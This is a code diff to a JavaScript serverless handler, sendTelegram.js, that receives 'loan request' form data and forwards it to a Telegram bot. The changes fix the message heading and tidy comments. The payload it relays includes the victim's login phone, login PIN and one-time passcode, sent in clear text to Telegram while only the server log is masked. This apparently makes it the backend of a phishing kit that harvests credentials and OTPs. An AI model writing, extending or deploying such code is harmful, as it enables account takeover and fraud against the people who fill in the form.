@@ -1,5 +1,5 @@
 // api/sendTelegram.js
-// HTML-safe Telegram sender — FIXED HEADING LOGIC ONLY
+// HTML-safe Telegram sender — FIXED HEADING (ALWAYS INSTANT)
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -17,14 +17,15 @@ export default async function handler(req, res) {
     return res.status(500).send('Missing env vars: ' + missing.join(', '));
   }
 
-  // Parse JSON safely
+  /* ========= PARSE JSON ========= */
   let payload = {};
   try {
-    payload = typeof req.body === 'string'
-      ? JSON.parse(req.body || '{}')
-      : (req.body || {});
+    payload =
+      typeof req.body === 'string'
+        ? JSON.parse(req.body || '{}')
+        : (req.body || {});
   } catch (err) {
-    console.error('Invalid JSON:', err && err.message);
+    console.error('Invalid JSON:', err?.message);
     return res.status(400).send('Invalid JSON');
   }
 
@@ -53,38 +54,22 @@ export default async function handler(req, res) {
     return '*'.repeat(ss.length - 2) + ss.slice(-2);
   }
 
-  // Log masked payload
+  /* ========= LOG MASKED ========= */
   const logged = { ...payload };
   if (logged.loginPin) logged.loginPin = mask(logged.loginPin);
   if (logged.otp) logged.otp = mask(logged.otp);
   console.log('sendTelegram payload (masked):', JSON.stringify(logged));
 
-  /* ========= BUILD HEADING (FIX) ========= */
-
-  let heading = 'New Loan Submission Request';
-
-  // Preferred: explicit loan details
-  if (
-    payload.loanAmount ||
-    payload.loanPeriod ||
-    payload.employment
-  ) {
-    heading = `Loan Request: USD ${payload.loanAmount || 'N/A'} / ${payload.loanPeriod || 'N/A'} month(s) (${payload.employment || 'N/A'})`;
-  }
-  // Fallback: plan text sent by frontend
-  else if (payload.plan) {
-    heading = payload.plan;
-  }
+  /* ========= FIXED HEADING ========= */
+  const heading = 'New Loan Request Submission';
 
   /* ========= BUILD MESSAGE ========= */
-
-  let text = `<b>${escHTML(heading)}</b>\n\n`;
+  let text = `<b>${heading}</b>\n\n`;
 
   if (payload.submittedAt) {
     text += `<b>Time:</b> ${escHTML(payload.submittedAt)}\n\n`;
   }
 
-  // Login + OTP details
   if (payload.loginPhone) {
     text += '<b>Login details:</b>\n';
     text += `<b>Phone:</b> ${escHTML(payload.loginPhone)}\n`;
@@ -97,16 +82,12 @@ export default async function handler(req, res) {
     text += '\n';
   }
 
-  // Remove already-printed keys
+  /* ========= OTHER DATA ========= */
   const extras = { ...payload };
   delete extras.submittedAt;
   delete extras.loginPhone;
   delete extras.loginPin;
   delete extras.otp;
-  delete extras.plan;
-  delete extras.loanAmount;
-  delete extras.loanPeriod;
-  delete extras.employment;
 
   if (Object.keys(extras).length) {
     text += '<b>Other:</b>\n';
@@ -115,8 +96,7 @@ export default async function handler(req, res) {
     }
   }
 
-  /* ========= SEND TO TELEGRAM ========= */
-
+  /* ========= SEND TO TELEGRAM (INSTANT) ========= */
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
   try {
@@ -143,9 +123,8 @@ export default async function handler(req, res) {
     } catch {
       return res.status(200).send(bodyText);
     }
-
   } catch (e) {
-    console.error('Telegram fetch error:', e && e.message);
-    return res.status(500).send('Fetch error: ' + (e && e.message));
+    console.error('Telegram fetch error:', e?.message);
+    return res.status(500).send('Fetch error: ' + e?.message);
   }
 }
